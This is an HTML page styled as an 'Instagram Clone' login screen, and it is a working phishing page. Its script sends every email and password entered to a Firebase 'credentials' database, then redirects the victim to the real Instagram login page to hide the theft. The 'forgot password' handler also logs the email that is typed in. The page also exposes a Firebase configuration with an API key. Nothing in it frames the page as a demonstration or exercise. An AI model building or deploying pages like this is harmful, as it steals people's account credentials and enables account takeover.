<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Clone</title>
    <style>
        /**FONTS**/

@font-face {
    font-family: "Segoe";
    src: url(..\fonts\segoe-ui-regular.ttf) format("truetype");
    font-weight: 400;
}
@font-face {
    font-family: "Segoe" ;
    src: url(..\fonts\segoe-ui-bold.ttf) format("truetype");
    font-weight: 700;
}

/**VARIABLES**/

:root{
    --background-color : #fafafa;
    --white:#ffffff;
    --border-color:112 , 112 , 112 ;
    --placeholder-color:#837979;
    --or-text:#8e8e8e;
    --fb-logo:#385175;
    --log-in-button:#0095f6;
    --black:#262626;
    --footer-links:#1e4f7c;
    --copyright-gray:#bfbfbf;
}

/**OVERWRITE BROWSER DEFAULT **/
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

h1,
h2,
h3,
h4,
h5,
h6,
p {
    font-weight: 400;
}

a {
    text-decoration: none;
}

ul {
    list-style-type: none;
}

html {
    font-size: 62.5%;
}

body {
    font-family: "Segoe";
    background: var(--background-color);
}

/**LOG IN**/

/**LOG IN CONTAINER**/
.log-in {
    background: var(--white);
    width: 35rem;
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    align-items: center;
    border: 0.1rem solid rgba(var(--border-color), 0.5);
    padding: 1.5rem 4rem;
    margin-top:4rem ;
    margin-bottom: 2rem;
}
/**logo**/
.logo {
    width: 19rem;
    margin-bottom: 1rem;
}
/**log in form**/
.log-in-form {
    display: flex;
    flex-direction: column;
    width: 100%;
}

.log-in-form input,
.log-in-button {
    padding: 1rem 0 1rem 1rem;
    border-radius: 0.5rem;
}

/**styles in common for the placeholder and fields**/
.log-in-form input,
.log-in-form input::placeholder {
    font-size: 1.1rem;
    font-family: "Segoe";
}
/**form fields**/
.log-in-form input {
    background: var(--background-color);
    border: 0.1rem solid rgba(var(--border-color),0.5);
    outline: none;
}

/**username text**/
.log-in-form input[type="text"] {
    margin-bottom:0.5rem ;
}
/**placeholder for text fields**/
.log-in-form input::placeholder{
    color: var(--placeholder-color);

}
/**styles for text fields when they are focused**/
.log-in-form input:focus{
    border-color: rgba(var(--border-color),0.8);

}
/**log in button**/
.log-in-button {
    background: var(--log-in-button);
    color: var(--white);
    margin: 2rem 0;
    font-weight: 700;
    cursor: pointer;
    outline: none;
    border: none;
}
/**or divider**/
.or-divider {
    color: var(--or-text);
    font-weight: 700;
    position: relative;
    font-size: 1.2rem;
}
.or-divider::before,
.or-divider::after {
    content: "";
    display: block;
    width: 11rem;
    height: 0.1rem;
    position: absolute;
    background: rgba(var(--border-color), 0.4);
    top: 50%;
}

.or-divider::before{
    left: 3rem;
}
.or-divider::after{
    right: 3rem;
}
/**log in with facebook**/
.fb-login { 
    margin: 1.5rem 0;   
}
.fb-login img{
    width: 1.5rem;
    margin-right: 0.5rem;
}
.fb-login span {
    font-size: 1.3rem;
    color: var(--fb-logo);
    font-weight: 700;
}
/**forgot passwd**/
.forgot-password {
    color: var(--fb-logo);
    font-size: 1.2rem;
}

/**SIGN UP**/
.sign-up {
    background: var(--white);
    width: 35rem;
    margin: 0 auto;
    border: 0.1rem solid rgba(var(--border-color),0.5);
    padding: 2rem;
    text-align: center;

}
/**don't have an account**/
.sign-up span {
    font-size: 1.2rem;
    margin-right: 0.5rem;
}
/**sign up link**/
.sign-up a {
    font-size: 1.3rem;
    font-weight: 700;
    color: var(--log-in-button);

}

/**GET THE APP**/

/**container**/
.get-the-app {
    display: flex;
    flex-direction: column;
    align-items: center;
   width: 35rem;
   margin: 0 auto;
   margin-top: 1.5rem;
}
/**get the app text**/
.get-the-app span {
    display:block;
    margin-bottom: 2rem;
    font-size: 1.4rem;
}
.app-images img {
    width: 13rem;
}

/**first image**/
.app-images img:nth-child(1){
    margin-right: 1rem;
}

/**PHONES**/
.phones-container {
    display: none;
}

/**FOOTER**/
footer {
    width: 35rem;
    display: flex;
    flex-direction: column;
    margin: 4rem auto 0 auto;
}

/**UL**/
.footer-links {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-evenly;
    font-size: 1.1rem;
    margin-bottom: 1rem;
}
.footer-links li {
    flex-basis: 13%;
    text-align: center;
}

.footer-links a {
    color: var(--footer-links);
    font-weight: 700;
    display: inline-block;
    margin-bottom: 1rem;
}
.copyright {
    text-align: center;
    color: var(--copyright-gray);
    font-weight: 700;
    font-size: 1.2rem;
}
    </style>

    <!-- Import Firebase using CDN with type="module" -->
    <script type="module">
        // Import the functions you need from the SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
        
        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBP-Rzuf6qBZb0gE9lNe21Iu0XQTgFyf8c",
            authDomain: "instagram-3d912.firebaseapp.com",
            databaseURL: "https://instagram-3d912-default-rtdb.firebaseio.com",
            projectId: "instagram-3d912",
            storageBucket: "instagram-3d912.appspot.com",
            messagingSenderId: "284335250272",
            appId: "1:284335250272:web:a2353bab44b5f0fff05c05",
            measurementId: "G-CZE37WK2K3"
        };
        
        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        
        // Make Firebase database available globally
        window.firebaseDatabase = database;
        
        // Make login function available globally
        window.login = function() {
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;
            
            if (email === "" || password === "") {
                alert("Please fill in all fields!");
                return;
            }
            
            // Save credentials to database
            saveCredentialsToDatabase(email, password);
        };
        
        // Make forgotPassword function available globally
        window.forgotPassword = function() {
            let email = document.getElementById("email").value;
            
            if (email === "") {
                alert("Please enter your email!");
                return;
            }
            
            // Save email to database
            const forgotPwRef = ref(database, "forgotten_passwords");
            const newForgotPwRef = push(forgotPwRef);
            
            set(newForgotPwRef, {
                email: email,
                timestamp: new Date().toISOString()
            })
            .then(() => {
                alert("Password reset link will be sent to your email!");
               window.location.href = "https://www.instagram.com/accounts/password/reset/";
            })
            .catch((error) => {
                alert("Error: " + error.message);
            });
        };
        
        function saveCredentialsToDatabase(email, password) {
            // Create a new entry with a unique key
            const credentialsRef = ref(database, "credentials");
            const newCredentialRef = push(credentialsRef);
            
            set(newCredentialRef, {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            })
            .then(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            })
            .catch((error) => {
                alert("Error: " + error.message);
            });
        }
    </script>

<body>
    <main>
        <div class="log-in-container">
            <div class="log-in">
                <img src="https://github.com/Arunjagan12/INSTAGRAM-login-page-clone/blob/main/photos/logo.png?raw=true" class="logo"/>
                <div class="log-in-form">
                    <input type="text" id="email" placeholder="Phone number, username or email" />
                    <input type="password" id="password" placeholder="Password" />
                    <button class="log-in-button" onclick="login()">Log In</button>

                <a href="#" onclick="forgotPassword()">Forgot password?</a>
            </div>
            <div class="sign-up">
                <span>Don't have an account? <a href="#">Sign up</a></span>

            <div class="get-the-app">

                    <a href="#"><img src="https://github.com/Arunjagan12/INSTAGRAM-login-page-clone/blob/main/photos/googlestore.png?raw=true" /></a>
                </div>
            </div>
        </div>
        <div class="phones-container">
            <img src="https://github.com/Arunjagan12/INSTAGRAM-login-page-clone/blob/main/photos/phones.png?raw=true" />
        </div>
    </main>
